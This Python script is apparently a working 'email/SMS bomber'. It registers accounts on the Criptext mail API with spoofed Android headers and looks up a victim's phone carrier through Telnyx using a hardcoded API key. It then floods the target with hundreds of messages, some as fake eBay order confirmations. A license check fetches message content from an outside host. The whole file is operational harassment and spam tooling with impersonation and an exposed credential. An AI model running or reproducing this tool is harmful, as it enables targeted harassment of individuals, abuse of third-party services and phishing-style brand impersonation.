import requests
import json
import os
import time

def register():
    with requests.Session() as sess:
        global r
        url = "https://api.criptext.com/user"
        content = '{\"name\":\"eBay Transactions\",\"password\":\"EnjaktcGL7Hig3soU1mCPfMekhy50lUd03cXjGHpqI8=\",\"recipientId\":\"etsbay'+str(namegen)+'\",\"keybundle\":{"registrationId":14321,"signedPreKeyId":53,"signedPreKeyPublic":"BaCxgZyKKTktSzwqeJnQCvMTJd3JrLj4rnnatA4vIJ9z","identityPublicKey":"BZXw3fzZK2MJioAOfDNeV4gvMBC9PZ2hzTw1dhkubScB","signedPreKeySignature":"ickvS8G0tQJCDwW+nCYYbnouIZgNlq20o4kPpSiwFs1FqLAFyqDKAoBkX7enX15\/BraJ\/uR2wnlGuqWiJQseBw==","preKeys":[{"id":1,"publicKey":"BUBLHKvQYsSD\/A\/7QsrOYG3ckrzCShw66SsqFPLji5tH"},{"id":2,"publicKey":"BZ2+mncCFQzv5AUtNfo5jUY1kPttpcGOFbXtGF3Ijdxb"},{"id":3,"publicKey":"BZsCHi\/MAo30XhbXUsYoJHrv2OnX9Xim0gT8tFLb\/hYG"},{"id":4,"publicKey":"BSEgjM4muL7a5JNyWuf6MG06930QKob84bMjFqdNPzdJ"},{"id":5,"publicKey":"BSVc3qnevbmzmuXIX18CZLi\/NEoKJ5RT1FfR+9WiAGIQ"},{"id":6,"publicKey":"BWjKw5tOtAjfPuPPDllAvb8NUFzqwtpJ3AN49Y0bFSpL"},{"id":7,"publicKey":"BQ1bCQR\/IvW8Oj293Oerz3rs9jSlhICusETbGMZ5XV4C"},{"id":8,"publicKey":"BdgoDusZcMFwoo0LyzWXJavAG63xUbgUjyTvfTBqKl0s"},{"id":9,"publicKey":"Ba8NFYOOBRUakJg9tFB54xH\/7rbzoSj3WmxVl2xLu1lI"},{"id":10,"publicKey":"BZs186QJfiX1Fv8aBqw2V5\/3MCIEQsVIfWFzojHQf5NP"},{"id":11,"publicKey":"BYSJ0HDk\/VwW1KFguiZ60U033H+6Qu4O4Iavm1vp1rN7"},{"id":12,"publicKey":"BbpNubBngIgGfUNLPzT8v8rTn4nlGxIBg5dO3ItRO3oo"},{"id":13,"publicKey":"BdY+FNmPkMUvHULNyz843KwrUhmV4iYuS6QZ+CMCfLYE"},{"id":14,"publicKey":"BbeadzwsZSAHxzC8QxTnhT5spo5h7OqvZiHP2eAw\/OBb"},{"id":15,"publicKey":"BSPEBfIurkaiYAv9FVmfIJqeBJE65zF+fWUF0xZZ4UkK"},{"id":16,"publicKey":"BVhcMbplZOhIRXF6jN2vhcULl0aFltuUizjIw3Nqr0Vn"},{"id":17,"publicKey":"BR3CY8NG1oZGMxkLvOI88moa\/QYLnMKY\/1XXQqjpIYoG"},{"id":18,"publicKey":"BTcKCKfuH+FXXUyF1xUGsWKmyX4UGEIGcm8rEsiR+gVW"},{"id":19,"publicKey":"BfSgg73abHXMocR\/JriaTO5LQGP+XtVTV6eIdYxyG7YM"},{"id":20,"publicKey":"BRtXvdZ5Lb363tHiKAZG4t9aTMEOr3u0lA3GISjFf9dP"},{"id":21,"publicKey":"Bfl7lj4QqhaD0Dojaff1Pk8ZOeMYEMknjhWPVa1NnOdA"},{"id":22,"publicKey":"BUe5eKjWcQRzx6deyyd3Do\/i1LpRY4GA8z4O1w39tOwr"},{"id":23,"publicKey":"BSRrwbfky49Ku1OEfmoz4ccvDcYnILG+yyPUHCawJ1pz"},{"id":24,"publicKey":"BaRTAcU3pruoAZy1vlDJPpDEDO+a9A0qLlXNy9GWtKYn"},{"id":25,"publicKey":"BUWG79XGBOohfHE5XWJAJMELJrXqmiB22S9Is\/B20jYW"},{"id":26,"publicKey":"BSYfXgpCvLUed9eta3i1sCa3eufOmwpoYjNKbXZ3dqd2"},{"id":27,"publicKey":"BXCVd4CJgtlC5L1JZI3WZkug0zD4ohMWymEwNsC8LpEn"},{"id":28,"publicKey":"BaG1TH6QzkD0zjFqCNGq1GYHk5NBbPb9ChfjmhFtmpcy"},{"id":29,"publicKey":"BciJMklcXgHZs2JYx05cSmAUlx\/QSslu5EAmefBsnLhC"},{"id":30,"publicKey":"BWBNlXhbkvN1J3HgKSIkJMW1D9roX7A6QrFkRmTcFC4u"},{"id":31,"publicKey":"BXy+AFPITF0JX73gnRsZnAha\/VSU5qfpOUOgLLjRoQ0K"},{"id":32,"publicKey":"BZcGkqHNR50QVWwQpaD5S3dybV0xfgi9aPD1OILHxnUA"},{"id":33,"publicKey":"BQMmKDc1fwso6nLNPZqtzK\/lsKs7IOp+1Ncit\/gNEU4i"},{"id":34,"publicKey":"BaNxOtfXCq86o\/jHnh7alSFZTmVdbhC0Ov7W969WEkUY"},{"id":35,"publicKey":"BdYJk6DiDJimNrUCV24HymZZ\/RLvlqQ7ynEV37AL9kAg"},{"id":36,"publicKey":"BVY3zYJ+MQYmQ\/edCW9shd5QWk7tsK4o0ai0G4UV1FBC"},{"id":37,"publicKey":"BUDZYF80a6+YPT9LdqhwrxeHr+rGb9\/rKHeQ6kLBoswa"},{"id":38,"publicKey":"BT1BtiXFjuOadL0FMl4b2qV9DhxOcD5l5QzqeM0eMVMF"},{"id":39,"publicKey":"Bcpck+XDc7VR5eR6sF9S0MzUuuNcfC9rWF\/V5QDm3i8F"},{"id":40,"publicKey":"BS9ZnNXjluIJb\/TOaZ8FYh5VDCey9t8OQ3x4Ke1VNsps"},{"id":41,"publicKey":"BfBYj+Fx1Mf4KgdTIx5QPuv3MxqqayNgwtU2apEXWZhJ"},{"id":42,"publicKey":"BTlxP9rD0CPfjgjyzwMoLAuPc3n47e32ctY1q2WMoyoe"},{"id":43,"publicKey":"BQ+WdHmFwN5CwqlkLYuKGQv3JKP2ug9ztw2BPWNL54BC"},{"id":44,"publicKey":"BWMGr+an2IJubcH9QaPKfmAOyRjHaopvdPdulb+NHfdu"},{"id":45,"publicKey":"Bff5R41jUobcgxVNGV6RYOg8JZMiBb+zK75wXWDd7GBZ"},{"id":46,"publicKey":"BTycUaHOFUdMmrRg0U7iRMGbXrh4NHPYYv8nb0dxMg9x"},{"id":47,"publicKey":"BWgLCKSoIxKRLB4wo1j+WgeGp5ZSvORE7yk2zKd7FZEB"},{"id":48,"publicKey":"BUGY3EepScuo+2b5tJsyt\/k7Zl+GrpSE6GgHMh5UuC8c"},{"id":49,"publicKey":"BakDFLVN1nrKe0GqVLdO7zzIYzR4wBYEiZ9a81c6OWB\/"},{"id":50,"publicKey":"Bcc1Wru1c19huIFwZhc8j3isemfSgsk1WwNKW8p4tOhg"},{"id":51,"publicKey":"Ba6ibcrzzA4fx3QE70OxjawlAQaCcxUaQcCcK8nlMU5s"},{"id":52,"publicKey":"BcxH\/9vwtZWKUucgJVMSzWqAe98YAvasGkHcyJrdUIoP"},{"id":53,"publicKey":"BeNhNE9J7c5MLDis7PFq34YPDCYk80jV\/MKTtUuw+EZU"},{"id":54,"publicKey":"BS\/NeNIOP4\/aoT4RZM09bAOzEeF+c30QT6ZGGJv006Y9"},{"id":55,"publicKey":"BZRajItxyzqbdzNnAGYrmXVlR6B7cZ2vNqK5Xs4SIB5h"},{"id":56,"publicKey":"BVY8klJxPl1VWs20BsLo8krg2h3OjJZGRx4jR3opIDJJ"},{"id":57,"publicKey":"BY8ZGVBzygXCgJSHEmR+6SrBONP2jwHrSmzY72EMCCVL"},{"id":58,"publicKey":"BduE9lP9rI5+NCmZlxlLAxBxa9GdcCpIex5Zz66x5YR8"},{"id":59,"publicKey":"BTYLwsJlbWAZt04pbl0hquErOaPUfiZwbqLY6ae0uc0T"},{"id":60,"publicKey":"BQInzCsSiE0z4d6CL82TFaGvJv8S6o73GuAdn0XXXhFM"},{"id":61,"publicKey":"BVALH\/UPrMTJERmL7+drWzeAirifamjNCcj0JZr+QbBd"},{"id":62,"publicKey":"BVfZltD7SQ1G4af1vqm6r4iM5ZGy4iqb8GXnQ7OQ1pF1"},{"id":63,"publicKey":"BXVemg4BZWa7gixQ\/X1TZ+r9yGpwp1f6f2deqr5Qw9kP"},{"id":64,"publicKey":"BZ93M5D37dA5n0hYT\/Fya8WdfZ\/qbmd3cyXbubEV50FL"},{"id":65,"publicKey":"Bdil0UZafHQg5A3zNYjg7\/Rwv0VxBjsaoxCs4dpUPT9a"},{"id":66,"publicKey":"BUq2NqGhPzS+XVdTcWr1J3Pb0iGagCEuB9YwbETvh5Fl"},{"id":67,"publicKey":"BV5N\/eYpqWRrMkya0NJJJ5vAuYuUwK8liqzop\/urz2sp"},{"id":68,"publicKey":"BdYuSucW1lccy6Aj2e7t1bmHK+Le+GQULaegvQ6V28dH"},{"id":69,"publicKey":"BaCfebLDQmCERQTgjD3UjFu6s90QRIOYDTHVUE8tq8Zn"},{"id":70,"publicKey":"BUwCA6HxvHIJUY8HPGjbTtig1uqMVX2JYOoV+C0UT9wR"},{"id":71,"publicKey":"Bfshg3+ZTzN4h1l1Y6xyD+0o\/JbmjhflhqhunIJCufgn"},{"id":72,"publicKey":"BWSBHghx5QueGAHCtl87s3EExUR0czSF+4PQbrbtQfxP"},{"id":73,"publicKey":"BWvm+3hrv42unsL6cYQSjUE4ABKUdQn\/VOkNFI9PjGAH"},{"id":74,"publicKey":"BcyBqtr9FKA30AiFikVwB+f5K9TQOwyZSSC\/Y9U94jd4"},{"id":75,"publicKey":"BYzdzrX0CC8gUqgbyvI9DwPDDDm5NxyvrWOwU4IwWOAf"},{"id":76,"publicKey":"Bfv+9FpGRDVMrDGwygFK6SLhEvsknbG\/S17p9Sis2eUr"},{"id":77,"publicKey":"BRZaMIIMkr87N9CTTG7jr6ZMfWyCntatSehynHJ9+adm"},{"id":78,"publicKey":"BUDcxKgi0mqoTQWEC2VuSRqdzmciK42ZuO6dNQ9wDDVI"},{"id":79,"publicKey":"BUQwWGWO8WpvJLt5bpPk9ELYQsCzcy8Mq8rlTkD1Q7J5"},{"id":80,"publicKey":"BYZAPNtCenIRp+MoeuaTcy3vlSwFqGKoSRSkc8zwJaJw"},{"id":81,"publicKey":"BTWLnNqPdXVK4Nu6C5oUYZi0lUUOt\/Pd7RgCJC8eLJZG"},{"id":82,"publicKey":"BW+dhfdppYvoNTGMnio7AGfQ\/K9Q6dZEOXotHE3ExUY8"},{"id":83,"publicKey":"BVYIH6QMWFINPdlqTZLOY5OmzPOJbMa6LLO\/nJzNi28A"},{"id":84,"publicKey":"BeUMlebmqZRU1iWSdKyXF565EAyUC6SRaYlD6XJmVyUv"},{"id":85,"publicKey":"BeTSDx4q+cqLszSK3\/KSu4cJZ\/if6FQ62yt5Go8R+c9A"},{"id":86,"publicKey":"BYZEpI1JOJxFtoVJqhm9jUSYfzJezDgUsnSLTWI2S0dO"},{"id":87,"publicKey":"BfOLbu9dLLnjq4HM+2Yx8HTNAyfBC+y1wfKgzOhSNnkZ"},{"id":88,"publicKey":"BXengIdFlfiPdBM5J13y8EPeNaEqCj1X9vfQaQxytzVW"},{"id":89,"publicKey":"BYuy+eSA9mkN5YLCF75\/KzY5gaGw6qTSapoMTHA\/7fk4"},{"id":90,"publicKey":"BZ4nniwywTRz\/nA66itngtQ3+y5Hwce5Qp2Z41G71aBd"},{"id":91,"publicKey":"Be\/DUOjd2FIXdx0hQd8qdItBR+1WsT\/t3vRZxRaqZcUF"},{"id":92,"publicKey":"BX15WnSi+x4dnBAkDnxoUuilFoPtvGthuKO8gvynsT4h"},{"id":93,"publicKey":"BQ9SAFM+0XQZFhjaHMXdk8TLu4i8ocYcx3JhuZuRkdgU"},{"id":94,"publicKey":"BcJWmfHEPtGdaP+r\/cAdnox9IMPB4P6R4\/KNN+866vxx"},{"id":95,"publicKey":"BW5UxMgauPDmdjr6H0PUBfzRPGK74Y53AqsAUe3eQ257"},{"id":96,"publicKey":"BWyyv2egH6ec8Rwpwc3hadPYFQzIby6ndiK7tBZQ1od4"},{"id":97,"publicKey":"Bf5jOEOgcL0uMFvpTiKCVofJlIXtZpvYPWi2jRBGRPBm"},{"id":98,"publicKey":"BUJhrGDL1CMS0oPxIPETZBPFhFgIOuqSCsf40egD+isp"},{"id":99,"publicKey":"BeJ2Bczo64NlUe5jxovSsAsjEXoapiUt+zB8FSbxUkhO"},{"id":100,"publicKey":"BRyR1BFoA3QAUbf+MD98ZAuvbwral5R2TzgMU3vRrFwq"}],"deviceName":"Samsung SM-G960U1","deviceFriendlyName":"Samsung SM-G960U1","deviceType":3},\"recoveryEmail\":\"'+str(recoveryMail)+'\"}'
        headers = {
            "criptext-api-version": "11.0.0",
                "Accept-Language": "en_us",
                    "App-Version": "0.23.6",
                        "OS": "Samsung SM-G960U1 Android 10 (API 29)",
                            "Content-Type": "application/json; charset=utf-8",
                                "Content-Length": "7343",
                                    "Host": "api.criptext.com",
                                        "Connection": "Keep-Alive",
                                            "Accept-Encoding": "gzip",
                                                "User-Agent": "okhttp/3.12.1"
        }
        r = sess.post(url, headers=headers, data=content)
        global authToken
        authToken = r.text.split('"token":"')[1]
        authToken = authToken.split('","r')[0]
        return authToken
def startUp():
    typeAttack =  input("Email or SMS Attack [E/S]:  ")
    if  typeAttack == "E":
        clear()
        print("Email Bomb Selected")
        global sentMail
        sentMail  = 0
        time.sleep(1)
        clear()
        global targetMail
        targetMail = input("Enter Target Email: ")
        clear()
        print("Email: "+str(targetMail)+" Loaded Into Barrel -- Ready for Fire.")
        time.sleep(1)
        print("Time for the real show ;)")
        time.sleep(1)
        clear()
        global type2
        type2 = 2
        return targetMail
    
    elif typeAttack == "S":
        clear()
        print("SMS Bomb Selected")
        global sentSMS
        sentSMS  = 0
        time.sleep(1)
        clear()
        global targetNumber
        targetNumber = input("Enter Target Number: ")
        clear()
        print("Email: "+str(targetNumber)+" Loaded Into Barrel -- Checking Carrier Details...")
        time.sleep(1)
        clear()
        apiKey = "KEY0173F11C6B63CF4DA8DCA6D893E85BD2_gcTiiuXRq2RzTMU2hvs5iG"
        with requests.Session() as sess:
            url = "https://api.telnyx.com/v2/number_lookup/+1"+str(targetNumber)+"?type=carrier&type=caller-name"
            headers = {
                "Authorization": "Bearer "+str(apiKey),
                "Accept": "application/json",
                    "Content-Type": "application/json",
                    }
            r = sess.get(url, headers=headers)
            global carrier
            if "VERIZON" in r.text:
                print("Verizon Detected")
                carrier = "@vtext.com"
            elif "CELLCO" in r.text:
                print("Verizon Detected")
                carrier = "@vtext.com"
            elif "Cingular" in r.text:
                print("AT&T Detected")
                carrier = "@txt.att.net"
            elif "CINGULAR" in r.text:
                print("AT&T Detected")
                carrier = "@txt.att.net"
            elif "T-Mobile" in r.text:
                print("T-Mobile Detected")
                carrier = "@tmomail.net"
            elif "Sprint" in r.text:
                print("Sprint Detected")
                carrier = "@messaging.sprintpcs.com"
            elif "SPECTRUM" in r.text:
                print("Sprint Detected")
                carrier = "@messaging.sprintpcs.com"
            time.sleep(2)
            print("Time to Fire... ;)")
        global type
        type = 1
        clear()
def clear():
    os.system("clear")
def authenticated():
    recoYesNo =  input("Do you already have a token? [Y/N]: ")
    if recoYesNo  == "N":
        global recoveryMail
        recoveryMail = input("Enter Token  Registration  Email (temp-mail.org): ")
        register()
        clear()
        confirmationComplete = input("Token Registration Confirmation Sent to Mail. Type [Y] Once Confirmed: ")
        if confirmationComplete == "Y":
            print("Registration Complete --  Time to Bomb ;)")
            time.sleep(1)
            os.system("clear")
            startUp()
    elif recoYesNo  == "Y":
        authToken  = input("Please Provide the Token: ")
        clear()
        print("Auth Token Accepted")
        time.sleep(1)
        clear()
        startUp()
    else:
        print("Invalid Response Recieved")
        time.sleep(0.5)
        os.system("clear")
        authenticated()

def authenticate():
    with requests.Session() as sess:
        global r
        url = "http://starbucks.gg/auth.php"
        headers = {
            "User-Agent": "okhttp/3.12.1"
        }
        r = sess.get(url, headers=headers)
    x  = r.text
    y = json.loads(x)
    license = (y["license"])
    global namegen, contentBody
    namegen = (y["str1"])
    contentBody = (y["str2"])
    if license == "DESYRE389320":
        print("Auth Success")
        authenticated()
        time.sleep(3)
    else:
        print("Auth Failed  - License Revoked")
        authfail()




def mailBomb():
    with requests.Session() as sess:
        global r
        '''
        proxyz = random.choice(proxylist)
        proxies = {'https': 'https://' + proxyz, 'http': 'http://' + proxyz}
        sess.proxies = proxies
        '''
        url = "http://api.criptext.com/email"
        content = '{"subject":"eBay Order Confirmation for Fossil FTW6016","criptextEmails":[],"guestEmail":{"to":["'+str(targetMail)+'"],"cc":[],"bcc":[],"body":"Thanks for another purchase. Your order is confirmed. Well let you know when its on the way. In the meantime get our app to receive realtime tracking updates"}}'
        headers = {
            "Authorization": "Bearer "+str(authToken),
            "criptext-api-version": "11.0.0",
            "Accept-Language": "en_us",
            "App-Version": "0.23.6",
            "OS": "Samsung SM-G960U1 Android 10 (API 29)",
            "Content-Type": "application/json",
            "Content-Length": "180",
            "Host": "api.criptext.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.12.1",
        }
        r = sess.post(url, headers=headers, data=content, verify=False)

def smsBomb():
    with requests.Session() as sess:
        global r
        '''
            proxyz = random.choice(proxylist)
            proxies = {'https': 'https://' + proxyz, 'http': 'http://' + proxyz}
            sess.proxies = proxies
            '''
        url = "http://api.criptext.com/email"
        content = '{"subject":"'+str(namegen)+'","criptextEmails":[],"guestEmail":{"to":["'+str(targetNumber)+str(carrier)+'"],"cc":[],"bcc":[],"body":"'+str(contentBody)+'"}}'
        headers = {
            "Authorization": "Bearer "+str(authToken),
            "criptext-api-version": "11.0.0",
            "Accept-Language": "en_us",
            "App-Version": "0.23.6",
            "OS": "Samsung SM-G960U1 Android 10 (API 29)",
            "Content-Type": "application/json",
            "Content-Length": "180",
            "Host": "api.criptext.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.12.1",
        }
        r = sess.post(url, headers=headers, data=content, verify=False)


clear()
authenticate()
if type == 1:
    for i in range(250):
        smsBomb()
        sentSMS+=1
        clear()
        print("Sent Count: "+str(sentSMS))
        time.sleep(0.5)
elif type2 == 2:
    for i in range(350):
        mailBomb()
        sentMail+=1
        clear()
        print("Sent Count: "+str(sentMail))
        time.sleep(0.4)
